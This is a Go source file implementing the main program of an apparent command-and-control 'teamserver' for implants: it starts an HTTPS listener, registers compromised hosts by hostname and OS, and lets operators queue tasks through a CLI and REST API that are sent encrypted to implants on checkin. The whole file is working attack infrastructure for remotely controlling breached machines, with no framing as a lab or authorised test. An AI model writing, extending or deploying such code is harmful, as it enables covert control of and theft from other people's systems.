package main

import (
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/fortress/hydra-pro/dagger/teamserver/listener"
	"github.com/fortress/hydra-pro/dagger/teamserver/operator"
	"gopkg.in/yaml.v3"
)

type TeamserverConfig struct {
	Listen struct {
		HTTPS     string `yaml:"https"`
		DNS       string `yaml:"dns"`
		WebSocket string `yaml:"websocket"`
		ICMP      bool   `yaml:"icmp"`
	} `yaml:"listen"`
	Operator struct {
		CLI string `yaml:"cli"`
		API string `yaml:"api"`
	} `yaml:"operator"`
	TLS struct {
		CertFile string `yaml:"cert_file"`
		KeyFile  string `yaml:"key_file"`
	} `yaml:"tls"`
	KeyFile string `yaml:"key_file"`
}

func main() {
	configPath := flag.String("config", "teamserver.yaml", "path to config file")
	flag.Parse()

	cfg, err := loadConfig(*configPath)
	if err != nil {
		log.Fatalf("config: %v", err)
	}

	serverKeys, err := LoadOrGenerateKeys(cfg.KeyFile)
	if err != nil {
		log.Fatalf("keys: %v", err)
	}
	log.Printf("server public key: %s", hex.EncodeToString(serverKeys.Public[:]))

	// Initialize session and task management
	sm := NewSessionManager(serverKeys)
	tm := NewTaskManager()

	// Start HTTPS listener
	if cfg.Listen.HTTPS != "" {
		httpsListener := listener.NewHTTPSListener(cfg.Listen.HTTPS, cfg.TLS.CertFile, cfg.TLS.KeyFile,
			func(transport string, data []byte) ([]byte, error) {
				return handleImplantData(sm, tm, transport, data)
			})
		go func() {
			if err := httpsListener.Start(); err != nil {
				log.Printf("[https] %v", err)
			}
		}()
	}

	// Start operator CLI (if not daemonized)
	if cfg.Operator.CLI != "" {
		cli := operator.NewCLI(
			func() []string {
				sessions := sm.List()
				ids := make([]string, len(sessions))
				for i, s := range sessions {
					ids[i] = fmt.Sprintf("%x", s.ID)
				}
				return ids
			},
			func(sessionID string, taskType uint8, data []byte, timeout int) (interface{}, error) {
				if timeout > 3600 {
					timeout = 3600 // max 1 hour
				}
				return tm.Enqueue(sessionID, TaskType(taskType), data, time.Duration(timeout)*time.Second)
			},
		)
		go cli.Run()
	}

	// Start REST API
	if cfg.Operator.API != "" {
		api := operator.NewAPI(cfg.Operator.API,
			func() []string {
				sessions := sm.List()
				ids := make([]string, len(sessions))
				for i, s := range sessions {
					ids[i] = fmt.Sprintf("%x", s.ID)
				}
				return ids
			},
			func(sessionID string, taskType uint8, data []byte, timeout int) (interface{}, error) {
				if timeout > 3600 {
					timeout = 3600 // max 1 hour
				}
				return tm.Enqueue(sessionID, TaskType(taskType), data, time.Duration(timeout)*time.Second)
			},
		)
		go func() {
			if err := api.Start(); err != nil {
				log.Printf("[api] %v", err)
			}
		}()
	}

	log.Println("teamserver ready")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	log.Println("teamserver shutting down")
}

// handleImplantData processes incoming data from any transport
func handleImplantData(sm *SessionManager, tm *TaskManager, transport string, data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}

	// Parse message — register and checkin share fields
	type registerMsg struct {
		Op        string `json:"op"`
		Pubkey    string `json:"pubkey"`
		Hostname  string `json:"hostname"`
		OS        string `json:"os"`
		SessionID string `json:"session_id"` // required for checkin
	}
	var reg registerMsg
	if err := json.Unmarshal(data, &reg); err != nil {
		return nil, fmt.Errorf("parse: %w", err)
	}
	// Sanitize user-controlled strings for log safety
	reg.Hostname = sanitizeLogString(reg.Hostname)
	reg.OS = sanitizeLogString(reg.OS)

	switch reg.Op {
	case "register":
		pubkeyBytes, err := hex.DecodeString(reg.Pubkey)
		if err != nil {
			return nil, fmt.Errorf("decode pubkey: %w", err)
		}
		session, err := sm.Register(pubkeyBytes, reg.Hostname, reg.OS)
		if err != nil {
			return nil, fmt.Errorf("register: %w", err)
		}
		log.Printf("[%s] new implant: %x (%s/%s)", transport, session.ID, session.Hostname, session.OS)
		resp := map[string]interface{}{
			"session_id": fmt.Sprintf("%x", session.ID),
			"pubkey":     hex.EncodeToString(sm.keys.Public[:]),
		}
		respBytes, _ := json.Marshal(resp)
		return respBytes, nil

	case "checkin":
		if reg.SessionID == "" {
			return nil, fmt.Errorf("checkin requires session_id")
		}
		session := sm.Get(reg.SessionID)
		if session == nil {
			return nil, fmt.Errorf("unknown session: %s", reg.SessionID)
		}
		session.Touch()
		task := tm.Dequeue(reg.SessionID)
		if task == nil {
			return []byte{}, nil // no tasks
		}
		encrypted, err := EncryptTask(task, &session.SessionKey)
		if err != nil {
			return nil, fmt.Errorf("encrypt task: %w", err)
		}
		return encrypted, nil

	default:
		return nil, fmt.Errorf("unknown op: %s", reg.Op)
	}
}

// sanitizeLogString strips non-printable characters and truncates to 256 bytes
func sanitizeLogString(s string) string {
	b := []byte(s)
	out := make([]byte, 0, len(b))
	for _, c := range b {
		if c >= 32 && c < 127 {
			out = append(out, c)
		}
	}
	if len(out) > 256 {
		out = out[:256]
	}
	return string(out)
}

func loadConfig(path string) (*TeamserverConfig, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read config: %w", err)
	}
	cfg := &TeamserverConfig{}
	if err := yaml.Unmarshal(data, cfg); err != nil {
		return nil, fmt.Errorf("parse config: %w", err)
	}
	return cfg, nil
}
